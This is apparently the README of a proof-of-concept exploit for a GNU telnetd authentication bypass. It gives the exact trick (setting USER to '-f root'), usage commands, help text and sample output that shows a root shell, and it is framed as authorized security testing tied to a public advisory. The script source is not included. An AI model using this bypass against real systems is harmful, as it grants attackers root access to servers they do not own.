GNU telnetd Authentication Bypass Vulnerability PoC

Vulnerability Type: Authentication Bypass
Affected: GNU telnetd with certain configurations

Description:
    This script tests for a vulnerability in GNU telnetd where setting the
    USER environment variable to "-f root" can bypass authentication and
    obtain a root shell.

Usage:
    python3 gnu_telnetd_auth_bypass.py <target>

Example:
    python3 gnu_telnetd_auth_bypass.py 192.168.1.100

Author: Security Researcher
License: MIT License
Disclaimer: For authorized security testing and educational purposes only.

https://www.openwall.com/lists/oss-security/2026/01/20/2

```bash
# pip install pexpect
python gnu_telnetd_auth_bypass.py 192.168.1.128
[+] Testing telnetd auth bypass on 192.168.1.128
[+] id output: uid=0(root) gid=0(root) groups=0(root)
                                                                                
[!!!] VULNERABLE: Authentication bypass confirmed (root shell obtained)

python gnu_telnetd_auth_bypass.py -h
usage: gnu_telnetd_auth_bypass.py [-h] [-t SECONDS] [-v] target

GNU telnetd Authentication Bypass Vulnerability PoC

This script tests for a vulnerability in GNU telnetd where setting the
USER environment variable to "-f root" can bypass authentication and
obtain a root shell.

positional arguments:
  target                Target IP address or hostname

options:
  -h, --help            show this help message and exit
  -t SECONDS, --timeout SECONDS
                        Connection timeout in seconds (default: 10)
  -v, --verbose         Enable verbose output

Examples:
  gnu_telnetd_auth_bypass.py 192.168.1.100
  gnu_telnetd_auth_bypass.py example.com -t 15
```
